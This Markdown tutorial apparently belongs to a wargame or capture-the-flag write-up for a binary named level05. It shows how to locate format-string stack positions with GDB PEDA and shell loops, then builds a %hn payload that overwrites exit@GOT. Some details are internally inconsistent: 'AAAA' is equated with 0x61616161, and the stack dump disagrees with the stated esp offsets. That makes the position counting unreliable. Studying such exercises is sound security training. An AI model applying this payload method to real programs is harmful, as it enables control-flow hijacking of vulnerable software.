# Finding Format String Parameter Positions Using GDB PEDA

This document explains how to determine the **stack positions** (like `%10$x` and `%11$x`) used in format string exploits, specifically for level05.

## What Are Format String Positions?

When you use `printf()` with format specifiers, it reads values from the stack:

```c
printf("%x %x %x", arg1, arg2, arg3);  // Normal usage
printf("%x %x %x");                     // Vulnerable - reads from stack!
```

With **direct parameter access**, you can specify which stack position to read/write:
- `%1$x` - First parameter (position 1)
- `%10$x` - Tenth parameter (position 10)
- `%10$n` - Write to address at position 10

## Why We Need to Find Positions

In level05, we control the input buffer. We need to find:
1. **Where our input buffer is on the stack** (so we can reference addresses we place there)
2. **Which positions point to our controlled data**

## Method 1: The AAAA Technique (Manual)

### Step 1: Start GDB and run with test input

```bash
gdb level05
gdb-peda$ run
```

### Step 2: Input a recognizable pattern with format specifiers

```
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
```

**Example Output:**
```
aaaa 64 f7fcfac0 f7ec3af9 ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
```

### Step 3: Look for 0x61616161 (AAAA in hex)

In the output above, `61616161` appears at the **10th position** (counting from the first `%x`).

**Note:** 
- `0x61` = 'a' in ASCII
- `AAAA` = `0x61616161` in little-endian hex
- `aaaa` in output = lowercase conversion by the program

### Step 4: Verify with direct parameter access

```bash
gdb-peda$ run
AAAA %10$x
```

**Output:**
```
aaaa 61616161
```

✅ **Confirmed:** Position 10 points to our input buffer!

### Step 5: Test consecutive positions

```bash
gdb-peda$ run
AAAA BBBB %10$x %11$x
```

**Output:**
```
aaaa bbbb 61616161 62626262
```

- Position 10 = `0x61616161` (AAAA)
- Position 11 = `0x62626262` (BBBB)

✅ **Confirmed:** Positions 10 and 11 point to consecutive 4-byte chunks of our input!

## Method 2: Using PEDA's Stack Inspection

### Step 1: Set a breakpoint at printf

```bash
gdb-peda$ disas main
```

Find the `printf` call address (e.g., `0x0804850c`):

```bash
gdb-peda$ break *0x0804850c
```

### Step 2: Run with your input

```bash
gdb-peda$ run
AAAA BBBB CCCC DDDD
```

### Step 3: Examine the stack when printf is called

```bash
gdb-peda$ x/20wx $esp
```

**Example Output:**
```
0xffffd650:	0xffffd66c	0x00000064	0xf7fcfac0	0xf7ec3af9
0xffffd660:	0xffffd69f	0xffffd69e	0x00000000	0xffffffff
0xffffd670:	0x61616161	0x62626262	0x63636363	0x64646464
0xffffd680:	0x0000000a	0x00000000	0x00000000	0x00000000
```

### Step 4: Count positions from ESP

The first argument to `printf` is at `[esp]` (the format string pointer itself).

Count 4-byte words from `$esp`:
- Position 1: `0xffffd66c` (format string pointer)
- Position 2: `0x00000064`
- Position 3: `0xf7fcfac0`
- ...
- Position 10: `0x61616161` ← **AAAA**
- Position 11: `0x62626262` ← **BBBB**
- Position 12: `0x63636363` ← **CCCC**
- Position 13: `0x64646464` ← **DDDD**

## Method 3: Automated Position Finding

### Create a test script:

```bash
for i in {1..20}; do
    echo "Testing position $i:"
    echo "AAAA %${i}\$x" | ./level05
done
```

**Look for output containing `61616161`:**

```
Testing position 1:
aaaa ffffd66c
Testing position 2:
aaaa 64
...
Testing position 10:
aaaa 61616161  ← Found it!
```

## Method 4: Using Pattern Offset (Advanced)

### Step 1: Create a unique pattern

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

### Step 2: Run with pattern and format specifiers

```bash
gdb-peda$ run
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL %10$x %11$x %12$x
```

### Step 3: Find pattern offset

```bash
gdb-peda$ pattern offset 0x41415341  # Value you see in output
```

This tells you the exact byte offset in your input buffer.

## Practical Application: Building the Exploit

Once you know positions 10 and 11 point to your input:

```python
# We want to write to two GOT addresses:
got_low  = 0x080497e0  # exit@GOT (low 2 bytes)
got_high = 0x080497e2  # exit@GOT+2 (high 2 bytes)

# Place addresses at the start of input (positions 10 and 11)
payload = p32(got_low) + p32(got_high)

# Use %10$hn to write to address at position 10
# Use %11$hn to write to address at position 11
payload += "%55412d%10$hn"  # Write to got_low
payload += "%10115d%11$hn"  # Write to got_high
```

## Understanding the Position Numbers

```
Stack Layout (simplified):
[esp+0]  → Position 1  (format string pointer)
[esp+4]  → Position 2
[esp+8]  → Position 3
...
[esp+36] → Position 10 ← Our input buffer starts here
[esp+40] → Position 11
[esp+44] → Position 12
```

## Quick Reference Commands

| Task | Command |
|------|---------|
| Find position manually | `echo "AAAA %x %x %x..." \| ./level05` |
| Test specific position | `echo "AAAA %10\$x" \| ./level05` |
| Test multiple positions | `echo "AAAA BBBB %10\$x %11\$x" \| ./level05` |
| View stack in GDB | `x/20wx $esp` (at printf breakpoint) |
| Create pattern | `gdb-peda$ pattern create 100` |
| Find pattern offset | `gdb-peda$ pattern offset 0x41415341` |

## Summary

**For level05:**
- **Position 10** = First 4 bytes of our input (used for `exit@GOT` low address)
- **Position 11** = Next 4 bytes of our input (used for `exit@GOT+2` high address)

**How we found it:**
1. Input `AAAA %x %x %x...` and look for `61616161`
2. Verify with `AAAA %10$x` → should output `61616161`
3. Confirm consecutive positions with `AAAA BBBB %10$x %11$x`

This allows us to place GOT addresses in our input and use `%10$hn` and `%11$hn` to write to them!

